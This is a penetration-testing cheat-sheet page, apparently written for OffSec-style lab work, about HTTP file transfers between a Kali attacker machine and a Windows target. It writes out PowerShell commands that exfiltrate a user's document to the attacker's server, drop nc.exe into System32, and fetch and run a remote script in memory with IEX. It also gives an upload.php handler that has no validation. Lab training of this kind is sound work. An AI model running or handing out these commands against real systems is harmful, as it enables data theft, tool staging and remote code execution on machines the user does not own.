---
title: HTTP File Transfer
layout: default
nav_order: 4
parent: File Transfers

---

# HTTP
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }
1. TOC
{:toc}

---

### Python HTTP Server (Kali Machine to Target Machine)

Start HTTP.server module in python3: 
```bash
python3 -m http.server 8000
```

Background HTTP.server process with `CTRL-Z` in terminal and the `bg` command


Use wget or PowerShell  on Windows Machine to download file on open port on Kali machine:
```powershell
$IP="192.168.119.239"
$port="8000"
wget http://${IP}:${port}/somefile.txt
```


NOTE: Sometimes, Internet explorer engine is not configured, so wget may not work on some machines. 

### Apache2 Server (Kali Machine to Target Machine)

Launch apache2 server on Kali machine: 
```bash
sudo systemctl start apache2
```

Create an `uploads.php` file in `/var/www/html` folder with the following contents: 
```bash
<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```

Create an /var/www/uploads folder:
```bash
sudo mkdir /var/www/uploads
```

Adjust permissions on  /var/www/uploads folder:
```bash
sudo chown www-data: /var/www/uploads
```

Restart apache2 server:
```bash
sudo systemctl restart apache2
```

#### Uploading files to Kali Machine
- ##### Upload file
```powershell
$IP="192.168.119.239"
$port="80"
(New-Object System.Net.WebClient).UploadFile('http://${IP}:${port}/uploads.php', 'C:\Users\offsec.CLIENT251\important.docx')
```

#### Downloading files to Windows machine from Kali Machine

- ##### Download as entire file: 
```powershell
$IP="192.168.119.239"
$port="80"
(New-Object System.Net.WebClient).DownloadFile('http://${IP}:${port}/nc.exe', 'C:\Windows\System32\nc.exe')
```

- ##### Download as string:
```powershell
$IP="192.168.119.239"
$port="80"
IEX(new-object system.net.webclient).downloadstring('http://${IP}:${port}/Sherlock.ps1')
```

- ##### Download via `wget`:
```powershell
$IP="192.168.119.239"
$port="80"
wget http://${IP}:${port}/Sherlock.ps1 -Outfile ./Sherlock.ps1
```